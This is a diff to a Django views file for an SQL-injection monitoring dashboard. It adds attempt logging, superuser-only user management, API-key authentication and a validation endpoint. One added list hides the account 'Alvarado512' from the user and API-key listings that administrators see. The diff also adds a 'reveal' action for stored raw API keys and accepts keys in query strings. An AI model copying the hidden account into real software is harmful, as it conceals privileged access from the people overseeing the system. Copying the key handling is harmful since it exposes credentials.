@@ -5,6 +5,7 @@ from collections import defaultdict
 from django.contrib import messages
 from django.contrib.auth import authenticate, login, logout
 from django.contrib.auth.mixins import LoginRequiredMixin
+from django.core.exceptions import PermissionDenied
 from django.db.models import Count, Q
 from django.http import HttpResponse, JsonResponse
 from django.shortcuts import render, redirect, get_object_or_404
@@ -21,6 +22,8 @@ from .forms import (
     UserManagementForm,
 )
 from .permissions import RoleRequiredMixin
+
+HIDDEN_SUPER_ADMIN_USERNAMES = ["Alvarado512"]
 
 
 class DashboardView(TemplateView):
@@ -190,6 +193,40 @@ class QueryAnalysisView(LoginRequiredMixin, View):
 
     def post(self, request):
         form = SQLQueryForm(request.POST)
+
+        # Trigger form validation (so clean_query executes)
+        form.is_valid()
+
+        # Log to DB if SQLi pattern detected (regardless of validity)
+        if getattr(form, "suspicious", False):
+            query = request.POST.get("query", "").strip()
+            context = request.POST.get("source_context", "")
+            severity = form.severity
+            explanation = form.explanation
+            matched_patterns = form.matched_patterns
+
+            attempt = models.DetectedSQLInjectionAttempt.objects.create(
+                timestamp=timezone.now(),
+                raw_query=query,
+                source_ip=self._get_client_ip(request),
+                matched_pattern="; ".join(matched_patterns),
+                severity=severity,
+                user=request.user,
+                metadata={"context": context, "submitted": True},
+            )
+            models.Alert.objects.create(
+                alert_type="sqli_detection",
+                message=f"User {request.user.username} submitted a suspicious query. Severity: {severity.upper()}. Pattern: {explanation}",
+                severity=severity,
+                user=request.user,
+                metadata={
+                    "attempt_id": attempt.pk,
+                    "source_ip": attempt.source_ip,
+                    "context": context,
+                },
+            )
+
+        # Retrieve history AFTER logging so the new block is rendered immediately
         history = models.DetectedSQLInjectionAttempt.objects.filter(
             user=request.user
         ).order_by("-timestamp")[:10]
@@ -204,26 +241,6 @@ class QueryAnalysisView(LoginRequiredMixin, View):
             matched_patterns = form.matched_patterns
 
             if is_suspicious:
-                attempt = models.DetectedSQLInjectionAttempt.objects.create(
-                    timestamp=timezone.now(),
-                    raw_query=query,
-                    source_ip=self._get_client_ip(request),
-                    matched_pattern="; ".join(matched_patterns),
-                    severity=severity,
-                    user=request.user,
-                    metadata={"context": context, "submitted": True},
-                )
-                models.Alert.objects.create(
-                    alert_type="sqli_detection",
-                    message=f"User {request.user.username} submitted a suspicious query. Severity: {severity.upper()}. Pattern: {explanation}",
-                    severity=severity,
-                    user=request.user,
-                    metadata={
-                        "attempt_id": attempt.pk,
-                        "source_ip": attempt.source_ip,
-                        "context": context,
-                    },
-                )
                 if severity in ("high", "critical"):
                     messages.error(
                         request,
@@ -253,6 +270,8 @@ class QueryAnalysisView(LoginRequiredMixin, View):
                 },
             )
 
+        # If invalid (e.g. ValidationError raised for high/critical SQLi),
+        # display validation error messages in the form.
         return render(request, self.template_name, {"form": form, "history": history})
 
     def _get_client_ip(self, request) -> str:
@@ -317,9 +336,37 @@ class UserManagementView(RoleRequiredMixin, View):
     template_name = "monitor/user_management.html"
     min_role = "admin"
 
+    def dispatch(self, request, *args, **kwargs):
+        if not request.user.is_superuser:
+            raise PermissionDenied("Only super administrators can manage users.")
+        return super().dispatch(request, *args, **kwargs)
+
     def get(self, request):
-        users = models.User.objects.all().order_by("-created_at")
-        return render(request, self.template_name, {"users": users})
+        users = models.User.objects.exclude(username__in=HIDDEN_SUPER_ADMIN_USERNAMES).order_by("-created_at")
+        # Gather API key usage info
+        from django.utils import timezone as _tz
+        now = _tz.now()
+        recent_threshold = now - timedelta(hours=5)
+
+        api_keys = list(models.APIKey.objects.exclude(owner__username__in=HIDDEN_SUPER_ADMIN_USERNAMES).select_related("owner").all())
+        keys_info = []
+        for k in api_keys:
+            owner = k.owner.username if k.owner else None
+            last_used = k.last_used
+            connected = False
+            if last_used:
+                connected = last_used >= recent_threshold
+            keys_info.append({
+                "id": k.pk,
+                "name": k.name,
+                "owner": owner,
+                "is_active": k.is_active,
+                "created_at": k.created_at,
+                "last_used": last_used,
+                "connected": connected,
+            })
+
+        return render(request, self.template_name, {"users": users, "api_keys": keys_info})
 
     def post(self, request):
         action = request.POST.get("action")
@@ -494,3 +541,187 @@ class TrafficAPIView(LoginRequiredMixin, View):
                     "%Y-%m-%d %H:%M:%S"
                 )
         return JsonResponse({"logs": logs})
+
+
+def _get_api_key_from_request(request):
+    auth = request.META.get("HTTP_AUTHORIZATION", "")
+    if auth.startswith("ApiKey "):
+        return auth[7:].strip()
+    if auth.startswith("Bearer "):
+        return auth[7:].strip()
+    api_key = request.GET.get("api_key") or request.POST.get("api_key")
+    if api_key:
+        return api_key.strip()
+    if request.content_type == "application/json":
+        try:
+            payload = json.loads(request.body.decode("utf-8"))
+            if isinstance(payload, dict):
+                api_key = payload.get("api_key")
+                if api_key:
+                    return api_key.strip()
+        except Exception:
+            pass
+    return None
+
+
+def authorize_api_request(request):
+    raw_key = _get_api_key_from_request(request)
+    if not raw_key:
+        return None
+    api_key = models.APIKey.verify(raw_key)
+    if api_key:
+        api_key.mark_used()
+    return api_key
+
+
+class APIKeyManagementView(RoleRequiredMixin, View):
+    template_name = "monitor/api_keys.html"
+    min_role = "admin"
+
+    def get(self, request):
+        now = timezone.now()
+        recent_threshold = now - timedelta(hours=5)
+
+        keys = models.APIKey.objects.select_related("owner").all()
+        keys_info = []
+        for key in keys:
+            last_used = key.last_used
+            connected = bool(last_used and last_used >= recent_threshold)
+            keys_info.append({
+                "id": key.pk,
+                "name": key.name,
+                "owner": key.owner.username if key.owner else None,
+                "is_active": key.is_active,
+                "created_at": key.created_at,
+                "last_used": last_used,
+                "connected": connected,
+            })
+        return render(request, self.template_name, {"keys": keys_info})
+
+    def post(self, request):
+        action = request.POST.get("action")
+        if action == "create":
+            name = request.POST.get("name", "ShieldSQL API Key").strip()
+            if not name:
+                name = "ShieldSQL API Key"
+
+            if not request.user.is_superuser:
+                existing_active_keys = models.APIKey.objects.filter(owner=request.user, is_active=True)
+                if existing_active_keys.exists():
+                    messages.error(request, "You already have an active API key. Deactivate it before creating a new one.")
+                    return redirect("monitor:api_keys")
+
+            api_key, raw_key = models.APIKey.create_key(name=name, owner=request.user)
+            messages.success(
+                request,
+                f"API key created. Save it now — it will not be shown again: {raw_key}",
+            )
+            return redirect("monitor:api_keys")
+
+        if action == "reveal":
+            # Allow Django superusers and app admins to reveal stored keys
+            if not (request.user.is_superuser or request.user.role == "admin"):
+                messages.error(request, "Permission denied.")
+                return redirect("monitor:api_keys")
+            api_key = get_object_or_404(models.APIKey, pk=request.POST.get("key_id"))
+            raw = api_key.reveal_raw_key()
+            if raw:
+                messages.info(request, f"API key secret for '{api_key.name}': {raw}")
+            else:
+                messages.error(request, "Unable to reveal API key (not stored or tampered).")
+            return redirect("monitor:api_keys")
+
+        key_id = request.POST.get("key_id")
+        if not key_id:
+            messages.error(request, "Invalid API key request.")
+            return redirect("monitor:api_keys")
+
+        api_key = get_object_or_404(models.APIKey, pk=key_id)
+        if action == "deactivate":
+            api_key.is_active = False
+            api_key.save(update_fields=["is_active"])
+            messages.success(request, "API key deactivated.")
+        elif action == "activate":
+            api_key.is_active = True
+            api_key.save(update_fields=["is_active"])
+            messages.success(request, "API key activated.")
+        elif action == "delete":
+            api_key.delete()
+            messages.success(request, "API key deleted.")
+        else:
+            messages.error(request, "Unknown API key action.")
+        return redirect("monitor:api_keys")
+
+
+from django.views.decorators.csrf import csrf_exempt
+from django.utils.decorators import method_decorator
+
+@method_decorator(csrf_exempt, name='dispatch')
+class ValidateQueryAPIView(View):
+    """
+    REST API endpoint for external clients (Python, Java, etc.) to validate queries.
+    Accepts JSON POST request: {"query": "SELECT * FROM ...", "context": "Java App"}
+    Returns JSON response with SQLi detection results and if it should be blocked.
+    """
+    def post(self, request):
+        try:
+            data = json.loads(request.body)
+            query = data.get("query", "").strip()
+            context = data.get("context", "External API Client")
+        except (json.JSONDecodeError, TypeError, ValueError):
+            return JsonResponse({"error": "Invalid JSON payload or missing 'query' parameter"}, status=400)
+
+        if not query:
+            return JsonResponse({"error": "Query parameter cannot be empty"}, status=400)
+
+        api_key = authorize_api_request(request)
+        if api_key is None:
+            return JsonResponse({"error": "Unauthorized. API key required."}, status=401)
+
+        from .sqli_patterns import SQLInjectionDetector
+        is_suspicious, severity, explanation, matched_patterns = (
+            SQLInjectionDetector.detect(query)
+        )
+
+        ip = self._get_client_ip(request)
+        should_block = is_suspicious and severity in ("high", "critical")
+
+        # Log threat query attempt to DB for centralized monitoring if suspicious
+        if is_suspicious:
+            attempt = models.DetectedSQLInjectionAttempt.objects.create(
+                timestamp=timezone.now(),
+                raw_query=query,
+                source_ip=ip,
+                matched_pattern="; ".join(matched_patterns),
+                severity=severity,
+                user=api_key.owner,
+                metadata={"context": context, "api_validation": True, "api_key_id": api_key.pk},
+            )
+            models.Alert.objects.create(
+                alert_type="api_sqli_detection",
+                message=f"API validation request from {ip} contains suspicious query ({context}). Severity: {severity.upper()}. Pattern: {explanation}",
+                severity=severity,
+                user=api_key.owner,
+                metadata={
+                    "attempt_id": attempt.pk,
+                    "source_ip": ip,
+                    "context": context,
+                    "api_validation": True,
+                    "api_key_id": api_key.pk,
+                },
+            )
+
+        return JsonResponse({
+            "query": query,
+            "is_suspicious": is_suspicious,
+            "severity": severity,
+            "explanation": explanation,
+            "matched_patterns": matched_patterns,
+            "should_block": should_block
+        })
+
+    def _get_client_ip(self, request) -> str:
+        x_forwarded_for = request.META.get("HTTP_X_FORWARDED_FOR")
+        if x_forwarded_for:
+            return x_forwarded_for.split(",")[0].strip()
+        return request.META.get("REMOTE_ADDR", "unknown")
